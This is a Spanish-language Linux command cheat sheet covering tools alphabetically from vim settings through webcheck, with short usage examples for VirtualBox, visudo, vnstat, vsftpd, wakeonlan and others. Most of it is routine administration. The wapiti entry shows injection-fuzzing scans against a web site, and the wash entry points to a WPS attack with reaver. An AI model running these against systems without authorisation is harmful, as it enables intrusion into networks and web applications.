	:set hidden (Información sobre la columna y posición del cursor)
	:set ignorecase (Ignorar mayúsculas y minúsculas en las busquedas)
	:set showcmd (Mostrar la combinación de teclas que estamos entrando)
	:set nocompatible (Permite usar funcionalidades de vim que vi no soporta)
	:set hidden (Permite abandonar buffers sin guardarlos previamente)
	:color darkblue (Cambia el color del vim [evening, desert, elflord, koehler, morning..])
	:set cindent (Activa indentado automático)
	:set history=500 (Aumentar el historial de comandos a 500)
	:set undolevels=1000 (Aumentar pasos a deshacer a 1000)
	:set mouse=a/mouse= (Activa/desactiva el uso del ratón)
	:set paste/nopaste (Activa/desactiva el modo pegar texto literalmente)
	:spell (Activa el corrector ortográfico)
	:set spellfile=~/.vimdic  (Fija diccionario de palabras desconocidas)
	:set ruler (mostrar fila y columna del cursor y porcentaje del texto)
	:set ignorecase (Que ignore mayúsculas y minúsculas en las busquedas)
	:set linebreak (Para que las palabras no se corten al final de la linea)
	:set encoding=utf-8  (Codificación que se usará [utf-8])
	:set list (Mostrar los caracteres no imprimibles)
	:set wrap (Activa el cortado de líneas largas en pantalla)
	:set t_Co=256 (La terminal con 256 colores)
1.-
Poner un esquema de colores:
$ mkdir -p ~/.vim/colors (Crear el directorio caso de no existir)
Entrar en <http://www.vim.org/scripts/script_search_results.php> y escoger los deseados y copiarlos en el directorio creado. Despues crear [si no existe] el fichero:
$ vim .vimrc
Y pegar el texto:
	syntax on
	colorscheme oceandeep
En colorscheme poner el escogido, en este caso oceandeep. Guardar.
2.-
Crear atajos de teclado [mapping]. Colocar en ~/.vimrc para hacerlo permanente:
Pulsar F2 para mostrar/ocultar los números de línea:
	:map <F2> <Esc>:set invnumber<CR>
Pulsar F3 para mostrar/ocultar los caracteres no imprimibles:
	map <F3> <Esc>:set invlist listchars=eol:$,tab:>-,trail:-<CR>
Pulsar F4 para activar el corrector ortográfico:
	map <F4> <Esc>:set spell spelllang=es<CR>
Nombre de las teclas especiales para el mapeo:
	<up>		Flecha arriba				<down>		Flecha abajo
	<right>		Flecha derecha				<left>		Flecha izquierda
	<esc>		Escape						<cr>		Enter
	<space>		Espacio						<tab>		Tabulador
	<del>		Suprimir					<bs>		Backspace
	<f1>..<f12>	Teclas de función			<insert>	Insert
	<end>		Fin							<c-tecla>	Control + tecla
	<RePag>		Página anterior				<AvPag>		Página siguiente
	<s-tecla>	Shift + tecla				<c-s-tecla>	Control + shift + tecla
3.-
Copiar y pegar texto de vim a las X y viceversa:
Comprobar si vim tiene soporte para xterm_clipboard lanzando vim y ejecutando:
	:version
Las opciones precedidas con "+" estan habilitadas y las con "-" deshabilitadas. La solución, si está deshabilitada, es compilar vim con dicha opción o instalar vim-gtk o gvim (según distro). El proceso en vim es seleccionar el texto a copiar y:
	"+y
Y pegar en cualquier editor (gedit, pico...) con Ctrl + v o con el botón derecho del mouse. El proceso inverso, o sea copiar en otro editor y pegar en vim será seleccionando y copiando el texto con el mouse y pegarlo en vim con:
	"+p
Nota- Para que todo lo copiado en Vim se asigne automáticamente al portapapeles del sistema operativo, añadir a .vimrc:
	set clipboard=unnamedplus
4.-
Abrir un panel lateral con el arbol de directorios [Plugin NERDTree]
	$ git clone https://github.com/scrooloose/nerdtree.git
	$ cd nerdtree/
	$ cp -R * ~/.vim/
Para abrir NERDTree pulsando F5 colocar en .vimrc la linea:
	map <F5> :NERDTreeToggle<cr>


vimdff
Editar dos, tres o cuatro versiones de un archivo con Vim y mostrar sus diferencias.
$ vimdff file1 file2 (comparar dos archivos linea a linea con vim. De forma predeterminada, vimdiff divide la pantalla verticalmente)
$ vimdff -o file1 file2 (división de pantalla horizontal)


vimtutor
Tutorial de vim. Se encuentra en /usr/share/vim/vim90/tutor/ en varios idiomas
$ vimtutor -g es (Mostrar el español. Recordar que para salir del tuto :qa)


vinetto
Programa para extraer imágenes en miniatura y sus metadatos de los archivos Thumbs.db que se generan en Microsoft Windows.
Aquí hay algunos ejemplos de cómo usar el comando vinetto :
$ vinetto archivo_thumbs.db (forma básica)
$ vinetto -o vinetto_output /dir_thumbs.db/* (extraer miniaturas de un dir y guardarlas en el dir vinetto_output)
$ vinetto -Ho vinetto_output /dir_tThumbs.db/* (extraer miniaturas en el dir vinetto_output y producir un informe html para previsualizarlas en el navegador)


vipe
[moreutils]. Permite editar en medio de una tubería los datos que están siendo canalizadas entre programas.
$ ls | vipe | ifdata -pb eth0


vipw
Editor que permite modificar el fichero /etc/passwd en modo seguro. La diferencia de editarlo con vipw o hacerlo con cualquier otro editor (gedit, nano...) es que vipw bloquea el fichero para evitar ediciones simultaneas y en el momento de guardar los cambios realiza un chequeo del fichero en busca de fallos de sintaxis.
# vipw (Edita el fichero /etc/passwd)
# vipw -s (Editar el fichero /etc/shadow)


virtualbox
[vitualbox-guest-utils linux-headers-$(uname -r) build-essential dkms]. Herramienta que permite la virtualización de sistemas operativos.
En la página https://www.virtualbox.org/wiki/Downloads apartado "VirtualBox 4.2 Oracle VM VirtualBox Extension Pack" clicar en "All platforms" y Descargar el paquete de extensiones Oracle_VM_VirtualBox_Extension_Pack-4.2.0-80737.vbox-extpack. Para instalarlo, doble clic en el paquete y seguir instrucciones [aceptar condiciones y contraseña de root].
# usermod -aG vboxusers USUARIO (Agregar usuario al grupo vboxusers)
# gpasswd -a $USER vboxsf (Agregar usuario al grupo vboxsf)
# modprobe vboxdrv (Activar módulo)
$ VBoxManage extpack install Oracle_VM_VirtualBox_Extension_Pack-4.2.16-86992.vbox-extpack (instala un pack de extensiones)
$ VBoxManage list extpacks  (Ver paquetes de expansión instalados)
1.-
Gestión de máquina virtuales desde consola:
Para la gestión de máquinas virtuales sin interfaz gráfica, se utiliza VboxHeadless para tal proposito que incluye diferentes comandos que veremos en las próximas líneas.
$ VBoxManage createvm --name "maquina_virtual" --register (Creamos una máquina virtual con el nombre "maquina_virtual")
$ VBoxManage modifyvm "maquina_virtual" --memory 780 --acpi on --boot1 dvd --nic1 bridged --bridgeadapter1 eth0 --ostype Ubuntu (Modificamos la máquina virtual que hemos creado, asignándole 780MB de RAM, activando ACPI, definiendo que arranque desde CD/DVD, indicando que la tarjeta de red sea en modo bridge y que el la tarjeta de red del sistema a usar es la eth0, y finalmente definiendo que la máquina será un Ubuntu.)
$ VBoxManage createvdi --filename ~/VirtualBox\VMs/maquina_virtual/maquina_virtual-disk01.vdi --size 30000 (Creamos un disco duro en formato VDI de 30 GB)
$ VBoxManage modifyhd maquina_virtual-disk01.vdi --resize 60000 (Redimensionar el espacio del fichero VDI en MB)
$ VBoxManage storagectl "maquina_virtual" --name "IDE Controller" --add ide (Añadimos un controlador IDE para posteriormente conectar el disco duro)
$ VBoxManage storageattach "maquina_virtual" --storagectl "IDE Controller" --port 0 --device 0 --type hdd --medium ~/VirtualBox\VMs/maquina_virtual/maquina_virtual-disk01.vdi (Asignamos el disco duro a la máquina virtual)
$ VBoxManage storageattach "maquina_virtual" --storagectl "IDE Controller" --port 1 --device 0 --type dvddrive --medium ~/IS
O/ubuntu-12.04.2-server-i386.iso (Asignamos a la máquina Virtual una ISO de instalación, en este caso de Ubuntu Server)
$ VBoxManage modifyvm "maquina_virtual" --pae on (activamos PAE en la máquina Virtual)
$ VBoxManage modifyvm "maquina_virtual" --memory 512 (Modificamos la RAM a 512MB)
$ VBoxHeadless --startvm "maquina_virtual" (arranca una máquina virtual)
$ VBoxHeadless --startvm "maquina_virtual" -e "TCP/Ports=7000" & (Arrancamos la máquina virtual indicando que queremos un servidor RDP para conexión remota en el puerto 7000)
$ VBoxManage controlvm "maquina_virtual" poweroff (Para la máquina virtual. Recomendable parar primero la máquina virtual desde la maquina virtual y luego ejecutar esto)
$ VBoxManage clonehd Metasploitable.vmdk ../Metasploitable2-Linux.vdi -format VDI (Convertir una imagen vmdk en vdi)


virtualenv
Crea contenedores para Python. Similar al concepto de Docker para hacer la aplicación instalada dentro del contenedor independiente de las versiones de Python del sistema.
$ virtualenv nombre_contenedor (Crea el contenedor)


virt-what
Script de shell que detecta si un programa se está ejecutando en una máquina virtual (VM).
$ virt-what


visitors
Muestra estadisticas del sitio web local.
# visitors -A /var/log/apache2/access.log -o html > report (Activar todas las opciones [-A] que guarde la salida en formato html [-o] y que base el informe en el archivo /var/log/apache2/access.log)


visudo
Editor que permite modificar el fichero /etc/sudoers en modo seguro. La diferencia de editarlo con visudo o hacerlo con cualquier otro editor (gedit, nano...) es que visudo bloquea el fichero para evitar ediciones simultaneas y en el momento de guardar los cambios realiza un chequeo del fichero en busca de fallos de sintaxis.
# visudo (Edita el fichero /etc/sudoers)
# visudo -c (Chequea si existen errores en /etc/sudoers)
# visudo -f archivo (Especificando un archivo alternativo al por defecto de /etc/sudoers)


vlc
Reproductor de video y audio
$ vlc -I  (listar opciones. La opción es “i” mayúscula)
$ vlc -l | grep -i interface  (ver solo las interfaces)
$ vlc -I ncurses (arrancar en modo ncurses)
$ vlc -I ncurses cdda://sr0/ (lo mismo indicando dispositivo del CD)


vlock
Bloquea la terminal actual local o remota o bloquea todo el sistema de consola virtual, deshabilitando completamente todo el acceso a la consola. vlock cancela estos bloqueos cuando se escribe la contraseña del usuario que inició vlock o la contraseña de root. vlock es interesante en entornos de sistemas de múltiples usuarios permitiendo a unos usuarios bloquear sus sesiones mientras que otros pueden usar el mismo sistema a través de otro terminal virtual.
$ vlock (bloquear una sesión de consola)
$ vlock -c (bloquear la consola de la sesión actual [default])
$ vlock -a (bloquear todas las consolas. Si se está en una virtual bloquea todas las virtuales)
# vlock -n (bloquea todas la consolas de X)
# vlock -s (deshabilitar vlock)
Para desbloquearla, pulsar “enter” y la contraseña del usuario que la ha bloqueado.


vmkfstools
Modificar por duplicidad [msg.disk.duplicateUUID:Virtual disks] o asignar por ausencia [disk does not have a UUID] un nuevo UUID a un disco VMDK.
# vmkfstools -J getuuid virtual01.vmdk (Asignar nuevo UUID)
# vmkfstools -J setuuid virtual01.vmdk (Modificar el UUID)


vmstat
Herramienta de monitorización del rendimiento. Proporciona información acerca de procesos, actividad de la CPU, memoria, paginación, bloques de entrada salida e interrupciones.
# vmstat 2  (actualización cada dos segundo)


vmtouch
Diagnóstico y control de la caché del sistema de archivos. Es una herramienta para aprender y controlar la caché del sistema de archivos. Puede descubrir qué archivos almacena el sistema operativo en caché, indicarle que almacene en caché o expulse algunos archivos o regiones de archivos, bloquear archivos en memoria para que el sistema operativo no los expulse, etc.
$ vmtouch /bin (ver cuántas páginas de los archivos en /bin están en caché)
$ vmtouch -t archivo_grande.dat (traer archivos a memoria)
$ vmtouch -e archivo_a_expulzar.dat (expulsar archivos de la cache)
$ vmtouch -dl /var/www/htdocs/critico/ (bloquear en memoria todos los archivos de un directorio, en modo daemon)
$ vmtouch -vt archivo.txt (cuanto del archivo especificado está en memoria caché y mostrando progreso)
$ vmtouch -ve video.mp4 (desalojar video.mp4 de la memoria caché)


vncrec
[xutils-dev libxt-dev libxmu-dev libxaw7-dev]. Grabación de sesiones vnc. (https://wiki.ubuntu.com/ScreenCasts/VNCREC)
$ wget http://ronja.twibright.com/utils/vncrec-twibright.tgz
$ tar xzvf vncrec-twibright.tgz
$ cd vncrec-twibright/
$ xmkmf
$ make World
# cp -R vncrec-0.2 /usr/local/
# ln -s /usr/local/vncrec-0.2/vncrec/vncrec-twibright/vncrec/vncrec /usr/bin/vncrec
$ vncrec -record archivo IP_o_host:1  (iniciar conexión y grabación)
$ vncrec -play archivo   (reproducir la grabación)
$ vncrec -movie archivo | ffmpeg2theora --no-audio -o archivo.ogv – (convertir la grabación a formato ogv)


vncserver
Permitir acceso remoto
$ vncserver :1   (arrancar el servicio con el número de sesión 1)
$ vncpasswd   (Entrar una contraseña)
$ vncserver -kill :1   (Matar la sesión 1)
Conectarse desde el cliente:
$ vncviewer IP_o_host:1


vncviewer
Conexión remota
$ vncviewer host  (básica)
$ vncviewer host -bgr233 (Para conexiones lentas. Reduce la calidad del color)
$ vncviewer host -geometry 800x600 (Para conexiones lentas. Reduce la ventana)
$ vncviewer host -quality 0 (disminuir la calidad de la imagen y aumentar la compresión. El valor va de 0 a 9 siendo el 9 máxima calidad de imagen y menor compresión)


vnstat
Herramienta que guarda un registro del tráfico de nuestras conexiones de red seleccionadas. Sobre este registro realiza estadisticas de uso. Tambien permite mostrar estos registros en distintos formatos: datos del día, de la semana, el total descargado y un top10 con los días de mayor uso de ancho de banda.
# vnstat -u -i eth0 (crear la base de datos)
# vnstat -d -i eth0  (consultar informes por días [-h -> horas, -m -> meses])
# vnstat -i eth0
# vnstat -l -i eth0  (monitorizar en tiempo real hasta pararlo con Ctrl+c Al finalizar mostrará un resumen del periodo monitorizado)
# vnstat -tr  (por un periodo de 5 segundos)


vnstati
[vnstat]. Crea un png de la salida del comando vnstat.
$ vnstati -s -vs -i eth1 -o vnstat.png (Mostrando resumen del tráfico de salida [s], incluyendo datos por hora en gráfica vertical [vs], especificando la red y guardando en vnstat.png [o])
$ vnstati -h -c 15 -o vnstat2.png (por horas [h] y actualizando si han pasado 15 minutos del último reporte)


vobcopy
Ripear dvds.
$ vobcopy -i /dev/dvdrom -o /home/usuario/musica


vol_id
Mostrar tipo de fichero y uuid de una partición
# vol_id --export /dev/sda2
# vol_id --uuid /dev/sda2  (solo muestra el uuid)


vramsteg
Proporciona una barra de progreso que puede mostrar el tiempo transcurrido, el tiempo restante estimado, el porcentaje completado y las etiquetas.
ejemplo en un script:
$ nano vramsteg.sh
	#! /bin/bash
	for i in {0..10}
	do
         vramsteg --min 0 --max 10 --style text --current $i
	 sleep 1
	done
	echo
        vramsteg -r
Nota.- style puede ser "mono" [progreso en color blanco] o "text" [progreso con asteriscos] si no se especifica es en color [default]. -r es borrar la barra de progreso.


vrms
Para saber los paquetes contrib y non-free instalados y su porcentaje en el sistema en Debian.
$ vrms


vsftpd
Servidor de archivos ftp. Toda la configuración de encuentra en el archivo:
# nano /etc/vsftpd.conf
Algunos de los parámetros:
	anonymous_enable=NO (si no queremos accesos anonimos)
	local_enable=YES (Permitir accesos locales autentificados)
	write_enable=YES  (Permite escritura en el servidor)
	ftpd_banner=Entrando en el servidor ftp...
	chroot_local_user=YES (Enjaular la conexión a su propio directorio personal)
	max_clients=5  (limitar a 5 los accesos simultaneos)
	Nota.- Han de redigirirse los puertos 20 y 21 y el rango especificado en el archivo de configuración:
	pasv_min_port=44000
	pasv_max_port=44100
El cliente podrá conectarse al servidor via filezilla, gftp...


vtclock
Reloj digital.
$ vtclock -2 -d 1 (Usando la fuente 2 [de 1 a 5] y desplazandose por la terminal cada segundo)


vte
Terminal
$ vte -T (Lanza terminal semitransparente)
$ vte -g 60x10 -r red (Especificando medidas y color del cursor)


vterm-ctrl
Se refiere a una biblioteca de C99 que emula un terminal de tipo VT220 o xterm. Esta biblioteca no dibuja directamente en pantalla ni depende de un toolkit gráfico; solo interpreta secuencias de escape ANSI y mantiene el estado del "terminal virtual".
$ vterm-ctrl title linux (poner título a la terminal)
$ vterm-ctrl reset (limpiar la terminal)


vtmc
Realiza una presentación de alta calidad. Descarga: <https://github.com/jclulow/vtmc>
$ vtmc show DIR (mostrar las diapositicas del directorio DIR)
Opciones:
     j (diapositiva siguiente)
     k (diapositiva anterior)
     r (recargar la presente diapositiva)
     q (salir)


vtprint
Permite imprimir desde un host UNIX remoto a una impresora conectada a una terminal local solo archivos de texto y puede sustituir a lpr [ver]) en circunstancias en las que la impresora no está conectada directamente al host o no está disponible a través de TCP/IP. Incluye: vtprtoff (desactiva la redirección de texto ASCII a la impresora conectada a una terminal) y vtprton (la activa)
$ vtprint nota.txt


vttest
Proporciona un programa diseñado para probar la funcionalidad del terminal VT100 [o emulador]. También es compatible con el análisis de VT220, VT420 y xterm. Cuando se entra en el prompt del programa, se observa el menú y contiene instrucciones de funcionamiento en línea. Prueba tanto la visualización [secuencia de escape] como el manejo del teclado.
$ vttest (entrar en el prompt)


vuls
Escáner de vulnerabilidades. Automatiza el análisis de vulnerabilidad de seguridad del software instalado en un sistema. Utiliza múltiples bases de datos de vulnerabilidades de renombre, como la National Vulnerability Database (NVD). Crear en el directorio personal el archivo::
$ nano config.toml
Con, como mínimo, el siguiente contenido:
	[servers]
	[servers.localhost]
	host = "localhost"
	port = "local"
$ vuls commands (listado de comandos que pueden usarse)
$ vuls configtest (realizar un test)
$ vuls scan (realizar el escaneo de lo especificado en config.toml)
$ vuls report (ver el informe)
$ vuls tui (analizar vulnerabilidades)


vzrestore
Restaurar maquinas virtuales [ver vzdump]


vzdump
Realizar copias de seguridad y restaurar imágenes openvz. Vzdump es un programa de respaldo basado en shell para máquinas virtuales OpenVZ. Está hecho para contenedores que usan el sistema de archivos tradicional "simfs", no se puede usar para contenedores con sistema de archivos "ploop".
# vzdump --compress --dumpdir /home/USER/backup 101 (crear copia de seguridad de la máquina virtual [contenedor] comprimida, en el dir especificado y con el ID 101)
# vzdump --compress --dumpdir /home/USER/backup --all (crear copia de seguridad de todos los contenedores)
# vzrestore /home/USER/backup/vzdump-101.tgz 104 (restaurar la máquina virtual 101 desde la copia de seguridad con la nueva ID 104)


w
Ver que estan haciendo los usuarios conectados (ESER) y desde qué teminal (TTY) y equipo remoto (FROM), el tiempo que hace que no está realizando ninguna acción (IDLE), el tiempo utilizado por todos los procesos conectados al terminal (JCPU) y el utilizado por el proceso actual (PCPU) y el útimo comando ejecutado (WHAT). El comando interpreta la información del fichero /var/run/utmp.
# w


w-scan-cpp
Herramienta utilizada para escanear y detectar canales de televisión digital basado en VDR [Video Disk Recorder] y sucesor de w_scan.
$ w_scan_cpp -c? (lista completa de códigos de país)
$ w_scan_cpp -ft -c ES > channels.conf (escaneo de televisión digital terrestre [DVB-T/T2] en España. -fc [DVB-C - cable digital] y -fs [DVB-S/S2 satélite digital])
$ w_scan_cpp -ft -c ES --output-VLC > canales.xspf (generar una lista de canales en formato compatible con VLC [XSPF])
$ w_scan_cpp -ft -c ES --output-mplayer > ~/channels.conf (los canales en formato compatible con mplayer)
$ mplayer "dvb://NombreDelCanal" (reproducir un canal específico con mplayer)


w3m
Navegador
$ w3m -v URL (Para visualizar las url con imágenes en las tty)
Algunos atajos:
    H (ayuda)
    q (Salir)
    Q (Salir sin preguntar)
    Espacio (Desplazamiento por paginas)
    g (Ir a la parte superior)
    G (Ir a la parte inferior)
    Tab (Ir al siguiente enlace)
    Alt + Tab (Ir al enlace anterior)
    B (Ir a la página anterior)
    u (Muestra la URL)
    U (Abre cuadro de dialogo para entrar nueva URL)
    / (Buscar hacia delante una palabra)
    ? (Buscar hacia atras una palabra)
    v (Alterna entre vista normal y codigo fuente)
    R (Recargar	la página)
    s (Abrir historial reciente)


wait
Indica el estado de un proceso que se está ejecutando o se ha ejecutado en background o espera a que se realice determinado proceso o trabajo para continuar.
$ wait
$ wait PID  (Indicando el PID)
$ wait %2  (Indicando el número de proceso)


wait-for-it
Script de bash que esperará la disponibilidad de un host y un puerto TCP.
$ wait-for-it www.google.com:80 --echo "google está activo"
$ wait-for-it -t 1 www.google.com:80 --echo "google está activo" (activo después de 1 segundo)


wajig
Herramienta que engloba apt, apt-cache, dpkg, aptitude, apt-get y otros.
# wajig list-commands
	daily-upgrade (Ejecuta «update», después «dist-upgrade»)
	install (Instala un paquete)
	installrs (Instala un paquete y los que este sugiere y recomienda)
	auto-download (Ejecuta «update» y se descarga todos los paquetes actualizados)
	available (Muestra las versiones del paquete disponibles para su instalación)
	bug (Revisar los informes de error usando Debian Bug Tracker)
	detail (Ofrece una detallada descripción del paquete)
	file-find (Busca un archivo contenido en un paquete instalado)
	find-pkg (Busca un paquete Debian no oficial en apt-get.org)
	hold (Retiene los paquetes para evitar que se actualicen)
	last-update (Identifica el momento en que se realizo la última actualización)
	list-hold (Muestra los paquetes retenidos)
	new (Muestra los paquetes disponibles desde la última actualización)
	news (Obtiene las últimas noticias relativas al paquete)
	orphans (Muestra las bibliotecas que ningún paquete requiere)
	package (Generaa un archivo .deb de un archivo instalado)
	purge-depend (Purga paquete y aquellos que de el dependen, o que otros no requieren)
	readme (Muestra el archivo README de «/usr/share/doc»)
	restart (Detiene y reinicia un demonio, [wajig restart ssh])
	rpminstall (Instala un paquete .rpm de RedHat)
	search-apt (Busca archivos de Debian apropiados para sources.list)
	showinstall (Muestra los pasos que tomará una instalación)
	status (Muestra la versión y versiones disponibles de un paquete)
	toupgrade (Muestra paquetes susceptibles de ser actualizados)
# wajig install xclip
# wajig auto-download (eqivalente al apt update)
# wajig toupgrade (equivalente al apt upgrade)


wakeonlan
Permite reactivar y encender una o varias máquinas de forma remota que tengan placas base o tarjetas de red que admitan paquetes WoL [Wake-on-Lan]. Se necesita las direcciones MAC de las máquinas para construir los paquetes WoL y el BIOS/UEFI del equipo objetivo debe tener habilitado el soporte WoL.
$ wakeonlan 00:11:22:33:44:55 (enviará un paquete "magic packet" [para arrancarlo] a la dirección MAC 00:11:22:33:44:55)
$ wakeonlan -i 192.168.1.255 -p 4242 00:11:22:33:44:55 (especificando dirección IP y puerto)
$ wakeonlan -i dominio.dyndns.org -p 1111 00:01:22:f2:11:3e (cambiar la IP por el nombre de dominio si se tiene)
$ wakeonlan 01:02:03:04:05:06 01:02:03:04:05:07 (arrancar varias MACs)
$ wakeonlan -f archivo.wol (arancará los especificados en el archivo)
Los pcs especificados en archivo.wol han de seguir la siguiente estructura: MAC. IP y puerto :
        00:16:3e:a3:9d:a8	192.168.1.25		9
        00:16:3e:08:ed:c6	192.168.1.32            7
        f0:1f:af:1f:2c:60       dominio.dyndns.org      5
Nota.- La única columna imprescindible es la primera, la de la MAC, las otras dos pueden estar ausentes


wall
Enviar mensajes a todas las terminales
$ wall (al darle al enter, podrá escribirse un texto. Una vez finalizado se le da otra vez al enter y se pulsa Ctrl+d para enviarlo a todas las terminales, incluidas las tty abiertas)
$ wall [intro]
No quiero morir!!!!!!!!!!!! [intro]
[Ctrl+d]
Broadcast Message from lb@tux
    (/dev/pts/9) at 17:39 ...
No quiero morir!!!!!!!!!!!!
$ wall << finmensaje (lo mismo pero lo envia al introducir “finmensaje”)


wallstreet
Esta utilidad dividirá la consola en múltiples paneles de noticias y estadísticas como cualquier buena pantalla de computadora en Wall Street. Finalizar la aplicación pulsando C-c
$ wallstreet


wapiti
Permite auditar la seguridad de aplicaciones web. Realiza escaneos "black-box", es decir, no estudia el código fuente de la aplicación, pero escaneará las páginas web de las aplicaciones web desplegadas, buscando secuencias de comandos y formularios donde pueda inyectar datos. Una vez que obtiene esta lista, wapiti actúa como un fuzzer, inyectando cargas útiles para ver si un script es vulnerable.
$ wapiti --list-modules (listar modulos)
$ wapiti -u http://site.com/ -m sql --color (resaltar parámetros vulnerables [--color] y especificando un módulo [m])
$ wapiti -u http://site.com -m "-all,xss:get,exec:post" -v 1 (especificando varios módulos y nivel verbose 1 [imprimir cada url])
$ wapiti -u http://site.com -n 10 -b folder -v 2 -f html -o informe (limite de urls para leer [10] con el mismo patrón [evitar bucles interminables] y destino [o])
Nota.- el parámetro "v" puede ser: 0: quiet (default), 1: imprimir cada url y 2: imprimir cada ataque. El formato "f" puede ser txt, xml o json. El parámetro "b" puede ser "page": analizar sólo la página dada como URL raíz, "folder": analizar todos los URLs bajo la URL raíz [por defecto] y "domain": analizar todos los enlaces a las páginas que están en el mismo dominio que el URL pasada.


wapua
Navegador que muestra el código WML de la páginas visitadas.
$ wapua lapipaplena.org


wash
Detectar routers wifi con el WPS Pin activado. Sólo muestra las que sean compatibles con WPS. En el apartado "WPS Locked" debe constar "No". Luego proceder con el ataque con reaver (ver)
# wash -i mon0


watch
permite ejecutar repetidamente una sentencia u otro comando
$ watch -n 5 date (mostrará la fecha cada cinco segundos)
$ watch -tn1 'date +%r | figlet' (muestra la hora en un digital en consola)
$ watch -tn1 'date "+%r %F %A"'  (Muestra la fecha completa)
$ watch -n3 free -m (monitor de ram)


watchcatd
Daemon que monitoriza los procesos registrados, matándolos en caso de que se bloqueen. El archivo de configuración está en /etc/watchcatd.conf


watchdog
Es un daemon que escribe en /dev/watchdog cada diez segundos. Si el dispositivo se abre pero no se escribe en un minuto, la máquina se reiniciará. Esta característica está disponible cuando el kernel está construido con soporte de "watchdog de software" (estándar en los núcleos Debian) o si la máquina está equipada con hardware watchdog. La capacidad de reiniciar del software del kernel dependerá de estado de la máquina. La herramienta en sí misma ejecuta varias comprobaciones y actúa de manera adecuada si el sistema no está en buen estado.


watchgnupg
Escuchar un socket de dominio Unix creado por cualquiera de las herramientas GnuPG
$ watchgnupg --force (Elimina un archivo de socket ya existente. Esta opción se utiliza si no se ha dado ningún nombre de socket en la línea de comandos)
$ watchgnupg --homedir DIR (si no se da un nombre de socket, pase DIR a gpgconf para que se use el socket de un GnuPG que se esté ejecutando en suu directorio home)
$ watchgnupg --tcp n (En lugar de leer de un socket local, escucha conexiones en el puerto TCP n. Opcionalmente, también se puede dar un socket de dominio Unix como segunda fuente)
$ watchgnupg --time-only SOCKET (No imprima la parte de la fecha de la marca de tiempo)
$ watchgnupg --verbose SOCKET (Activar la salida de información adicional.)


watchman
Herramienta para observar archivos o directorios y registrar cuándo cambian realmente. Existe una amplia información en <http://facebook.github.io/watchman/docs/install>
$ watchman watch-project /home/user/docs (raíz lógica de un conjunto de archivos relacionados en el que consolidar las vigilancias)
Nota- Es preferible usar la opción "watch-project" a la "watch" que está desactualizada
$ watchman watch-list (muestra listado de registros)
$ watchman log debug "esto es una nota" (genera una línea de registro en el registro de watchman)
$ watchman find ~/docs/ notas.txt (busca los archivos que coinciden con el patrón "nota.txt" en el directorio especificado)
$ watchman watch-del ~/docs (elimina un reloj y cualquier disparador asociado)
$ watchman watch-del-all (elimina todos los relojes y activadores asociados)


watson
Controlar los tiempos que se dedican a un proyecto.
	$ watson start proyecto1 (iniciar el control del proyecto1)
	Starting project proyecto1 at 08:15
Lista de algunos comandos útiles:
	cancel - Cancelar la última llamada al comando de inicio. El tiempo no será registrado.
	frames - Mostrar la lista de todos los frames.
	log - Mostrar cada sesión grabada durante el período de tiempo determinado.
	projects - Lista todos los proyectos existentes.
	remove - Eliminar un frame.
	rename - Cambiar el nombre de un proyecto o etiqueta.
	report - Informe del tiempo dedicado a cada proyecto.
	restart - Reiniciar tiempo de monitoreo para un proyecto previamente detenido.
	status - Muestra cuándo se inició el proyecto actual y el tiempo transcurrido desde entonces.
	stop - Dejar de monitorear el tiempo para el proyecto actual.
	tags - Mostrar lista de todas las etiquetas.


wavemon
Permite observar los niveles de señal y ruido, paquetes estadísticas, configuración del dispositivo y parámetros de red de su hardware de red inalámbrica.
$ wavemon (abre el monitoreo)


waveterm
Wave es una terminal que combina las características tradicionales de una terminal con capacidades gráficas como vistas previas de archivos, navegación web y asistencia de IA. El desarrollo moderno implica cambiar constantemente entre terminales y navegadores: consultar documentación, obtener vistas previas de archivos, monitorear sistemas y usar herramientas de IA. Wave lleva estas herramientas gráficas directamente a la terminal, lo que permite controlarlas desde la línea de comandos.


wc
Cuenta caracteres, lineas, palabras...
$ wc /etc/hosts /etc/fstab (Muestra lineas, palabras y caracteres de los dos archivos)
$ wc -c /etc/fstab (bytes)
opciones:
-l (cantidad de líneas)
-w (cantidad de palabras)
-m (total de caracteres.)
-L (la longitud de la línea más larga del texto)


wcatalan
Paquete que proporciona el fichero /usr/share/dict/catala que contiene una lista alfabética de palabras catalanas.


wdctl
[util-linux]. Muestra el estado de la vigilancia del hardware. El dispositivo predeterminado es /dev/watchdog
# wdctl -F (no imprime información sobre flags)
# wdctl -r (formato de salida sin formato para la tabla de flags)
# wdctl -I (información de identidad del organismo de control y tabla de flags)
# wdctl -O (información en una sola linea)


wcd
Programa para cambiar de directorios rápidamente. Solo se precisa escribir una parte de un nombre de directorio y wcd saltarán a él. De manera predeterminada, wcd busca un directorio con un nombre que comienza con lo que se ha escrito. El uso de comodines también es totalmente compatible.


wdel
[wput]. Pequeño cliente ftp, que carga archivos o directorios a un servidor ftp remoto. Las caracteristicas principales son: reanudación, sellado de tiempo, interfaz tipo wget, proxy-soporte y límite de velocidad.


wdiff
Compara dos archivos, encontrando qué palabras se han eliminado o agregado al primero para crear el segundo. wdiff es particularmente útil cuando dos textos difieren solo por unas pocas palabras y se han rellenado párrafos.
$ wdiff texto.txt texto2.txt (forma básica)
$ wdiff -3 texto.txt texto2.txt (sólo mostrando la diferencias)


weather
[weather-util]. Estado del tiempo. Buscar el código de la ciudad en:
http://www.nws.noaa.gov/tg/siteloc.shtml
$ weather -m -v LEGE  (En decimal con la maxima información y para Gerona [España])


web2disk
Herramienta que permite descargar un sitio web, incluyendo imágenes, hojas de estilo y otros contenidos incrustados,  para navegar sin conexión.
$ web2disk URL


webalizer
Genera reportes en formato html de los accesos a una página web instalada en la misma máquina.
Configuración mínima:
# nano /etc/webalizer/webalizer.conf
Verificando que el siguiente contenido esté descomentado:
	LogFile         /var/log/apache2/access.log
	OutputDir       /var/www/webalizer
	Incremental     yes
	ReportTitle     Estidísticas de PAGINAWEB_NOMBRE
	Hostname URL_PAGINA
	IgnoreSite      localhost
Especificamos los logs a analizar [logfile], el directorio de salida de los resultados [outputdir], que analice todo por separado [incremental], título de la página de reporte [reporttitle], nombre de la página a analizar [hostname] y que innore los accesos desde la propia máquina [ignoresite]
# webalizer -c /etc/webalizer.conf -d (que se base en el archivo especificado [-c] y que haga debugging de los reportes por si todo salió sin errores [-d])
Dado que los reportes solo se realizan cuando se ejecuta el comando, es preferible colocar la linea en crontab:
$ crontab -e
Y añadir:
	0 0 * * * /usr/bin/webalizer -c /etc/webalizer.conf -d


webcheck
Revisa una URL, siguiendo sus enlaces y genera un informe index.html en el presente directorio.
# webcheck URL


webdruid
